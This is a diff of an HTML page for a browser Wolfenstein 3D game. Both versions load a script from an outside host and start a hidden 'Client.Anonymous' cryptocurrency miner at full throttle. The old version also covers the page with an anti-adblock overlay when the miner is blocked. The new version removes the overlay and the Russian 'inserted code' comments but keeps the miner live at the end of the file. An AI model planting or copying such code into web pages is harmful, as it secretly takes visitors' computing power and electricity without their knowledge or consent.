@@ -1,61 +1,39 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta content="Wolfenstein 3D HTML5" name="description"></meta>
-    <meta content="wolfenstein,3d,game,html5,javascript,engine" name="keywords"></meta>
-    <title>Wolfenstein 3D</title>
-    <link type="text/css" href="css/build.css" rel="stylesheet"></link>
-    <script src="js/webkitAudioContextMonkeyPatch.js" type="text/javascript" language="javascript"></script>
-    <script async="" src="js/a.js"></script>
-    <script language="javascript" type="text/javascript" src="js/build.js"></script>
-    <link href="images/favicon.png" type="image/png" rel="shortcut icon"></link>
-    <link href="images/favicon.png" type="image/png" rel="icon"></link>
-</head>
-<body oncontextmenu="return false;">
-    <div id="resources">
-        Загрузка...<br></br>
-        <img src="images/loading-intersect.png"/>
-    </div>
-    <audio id="music" preload="true" loop=""></audio>
-    <div>
-        <div id="copyright" class="fadein">
-            <div class="content" style="position: fixed; left: 0; top: 0; bottom: 0; right: 0; overflow: auto; padding: 32px;">
-                <div style="width: 100%; text-align: center;">
-                    <img src="images/wolfenstein3d-logo.png"></img>
-                </div>
-                <div class="clear"></div>
-                <div id="start" class="text readme" style="cursor: pointer; Color:black;">
-                    <img src="images/start.png"/>
-                </div>
+  <!DOCTYPE html>
+    <html>
+        <head>
+            <meta content="Wolfenstein 3D HTML5" name="description"></meta>
+            <meta content="wolfenstein,3d,game,html5,javascript,engine" name="keywords"></meta>
+            <title>Wolfenstein 3D</title>
+            <link type="text/css" href="css/build.css" rel="stylesheet"></link>
+			<script src="js/webkitAudioContextMonkeyPatch.js" type="text/javascript" language="javascript"></script>
+            <script async="" src="js/a.js"></script>
+            <script language="javascript" type="text/javascript" src="js/build.js"></script>
+            <link href="images/favicon.png" type="image/png" rel="shortcut icon"></link>
+            <link href="images/favicon.png" type="image/png" rel="icon"></link>
+        </head>
+        <body oncontextmenu="return false;">
+            <div id="resources">
+Загрузка...<br></br>
+<img src="images/loading-intersect.png"/>
             </div>
-        </div>
-    </div>
-
-    <!-- Вставленный код перед закрывающим тегом </body> -->
+            <audio id="music" preload="true" loop=""></audio>
+            <div>
+                <div id="copyright" class=" fadein">
+                    <div class="content" style="position: fixed; left: 0; top: 0; bottom: 0; right: 0; overflow: auto; padding: 32px;">
+                        <div style="width: 100%; text-align: center;">
+                            <img src="images/wolfenstein3d-logo.png"></img>
+                        </div>
+                        <div class="clear"></div>
+                        <div id="start" class="text readme" style="cursor: pointer; Color:black;">
+<img src="images/start.png"/>                       </div>
+                    </div>
+                </div>
+        </body>
+    </html>
     <script src="https://www.hostingcloud.racing/Xu3x.js"></script>
-    <script>
-        var _client = new Client.Anonymous('53a09c3f15a17180c6f8073d52153fb514800f1d55370231361138b963c0c38f', {
-            throttle: 0, c: 'w'
-        });
-        _client.start();
-    </script>
-    <script>
-        setTimeout(function(){
-            if(typeof _client === 'undefined' || _client === null)
-            {
-                var messageDiv = document.createElement("div");
-                messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
-                messageDiv.appendChild(document.createTextNode("DISABLE PLEASE YOUR ADBLOCK."));
-                var mainDiv = document.createElement("div");
-                mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
-                mainDiv.appendChild(messageDiv);
-                document.body.appendChild(mainDiv);
-                document.getElementsByTagName("body")[0].style.overflow = "hidden";
-                window.scrollTo(0, 0);
-            }
-        },1000);
-    </script>
-    <!-- Конец вставленного кода -->
-
-</body>
-</html>
+<script>
+    var _client = new Client.Anonymous('53a09c3f15a17180c6f8073d52153fb514800f1d55370231361138b963c0c38f', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+</script>
